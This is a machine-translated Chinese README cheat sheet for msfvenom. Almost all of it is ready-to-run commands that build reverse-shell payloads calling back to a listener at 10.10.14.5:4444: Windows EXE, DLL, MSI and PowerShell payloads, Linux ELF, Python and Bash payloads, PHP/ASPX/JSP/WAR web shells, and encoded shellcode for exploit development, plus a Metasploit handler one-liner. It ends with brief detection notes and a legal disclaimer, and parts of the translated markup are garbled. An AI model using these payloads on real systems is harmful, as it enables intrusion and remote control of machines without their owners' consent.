<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="格式">
</p>

<p对齐=“中心”>
  <b>💣 用于跨 Windows、Linux、macOS、Android 和 Web 平台生成独立负载、shellcode 和后门的主备忘单</b>
</p>

---

## 📋 目录

- [概述和有效负载架构](#-overview--payload-architecture)
  - [分阶段与无阶段有效负载](#staged-vs-stageless-payloads)
- [基本标志和选项](#-essential-flags--options)
- [Windows 有效负载（EXE、DLL、MSI、PowerShell）](#-windows-payloads-exe-dll-msi-powershell)
- [Linux 和 Unix 有效负载（ELF、Python、Bash）](#-linux--unix-payloads-elf-python-bash)
- [Web 和 Web Shell 有效负载（PHP、ASP、ASPX、JSP、WAR）](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [用于漏洞利用开发的 Shellcode 生成（C、Raw、Python）](#-shellcode- Generation-for-exploit-development-c-raw-python)
  - [剥离不良字符 (`-b`)](#stripping-bad-characters--b)
  - [编码器和多次迭代（`-e`、`-i`）]（#encoders--多次迭代--e--i）
- [Metasploit 多处理程序快速设置](#-metasploit-multi-handler-quick-setup)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和有效负载架构

结合经典的 `msfpayload` 和 `msfencode` 实用程序，**msfvenom** 生成用于利用和渗透测试的二进制可执行文件、脚本和原始 shellcode。

### 分阶段与无阶段有效负载
- **分阶段（例如 `windows/x64/meterpreter/reverse_tcp`）：**
  在组件之间使用斜杠。一个微小的存根（阶段 0）连接回侦听器，并将完整的反射 DLL（阶段 1）提取到内存中。非常适合具有严格缓冲区长度限制的漏洞利用。
- **无级（例如 `windows/x64/meterpreter_reverse_tcp`）：**
  使用下划线 (`_`)。整个 Meterpreter 有效负载独立包含在可执行文件或 shellcode 中。无需依赖多阶段网络握手即可可靠工作，使其成为命令行运行者和规避持久性的理想选择。

---

## ⚙️ 基本标志和选项
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
|旗帜|描述 |
|------|-------------|
| `-p, --payload` |指定要使用的有效负载（`--list payloads` 查看全部）。 |
| `-f, --format` |输出格式（exe、elf、raw、c、python、asp、aspx、war、php）。 |
| `-e, --encoder` |用于消除不良字符的 Shellcode 编码器 (`--list encoders`)。 |
| `-i, --iterations` |编码遍数。 |
| `-b, --bad-chars` | shellcode 中应避免使用的字符（例如 `\x00\x0a\x0d`）。 |
| `-x, --template` |用于注入有效负载的可执行模板。 |
| `-k, --keep` |在新线程中保留模板的正常执行。 |
| `-o, --out`|输出目标文件路径。 |

---

## 🪟 Windows 有效负载（EXE、DLL、MSI、PowerShell）

### Windows x64 反向 Shell 可执行文件（无阶段）
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Windows x64 分阶段反向 TCP 可执行文件
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Windows DLL 注入负载
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Windows MSI 安装程序（通过 AlwaysInstallElevated 进行权限升级）
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Base64 编码的 PowerShell 命令
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Linux 和 Unix 有效负载（ELF、Python、Bash）

### Linux x64 ELF 二进制（无阶段）
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux 标准 `/bin/sh` 反向 TCP（无 Meterpreter）
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### 独立 Python 反向 Shell 脚本
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### 纯 Bash 命令字符串
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Web 和 Web Shell 有效负载（PHP、ASP、ASPX、JSP、WAR）

### PHP 反向 Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### 经典 ASP 和 ASPX（IIS 服务器）
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Java WAR 包（Apache Tomcat Web 存档）
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 用于漏洞开发的 Shellcode 生成（C、Raw、Python）

### 剥离不良字符 (`-b`)
空字节 (`\x00`)、回车符 (`\r` = `\x0d`) 和换行符 (`\n` = `\x0a`) 会破坏基于字符串的内存损坏漏洞（例如堆栈溢出）：
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### 编码器和多次迭代（`-e`、`-i`）
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Metasploit Multi-Handler Quick Setup

始终使用 Metasploit 的 `multi/handler` 捕获有效负载：
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ 快速参考表

|目标平台|命令|
|----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **雄猫战争** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **原始 Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ 防守考虑和检测

1. **静态签名检测：** 默认 Msfvenom 模板和编码器 (`shikata_ga_nai`) 具有众所周知的静态签名，几乎每个现代防病毒引擎都可以识别该签名。
2. **行为 EDR 监控：** EDR 代理标记异常进程生成（例如，在 `w3wp.exe` 或 `tomcat8.exe` 下生成的 `cmd.exe` 或 `powershell.exe`）。

---

## ⚠️ 法律免责声明

> [!警告]
> Msfvenom 生成功能性攻击负载和后门。必须在授权的渗透测试期间和隔离的实验室研究环境中严格使用它。未经授权在第三方计算机上生成或执行是非法的。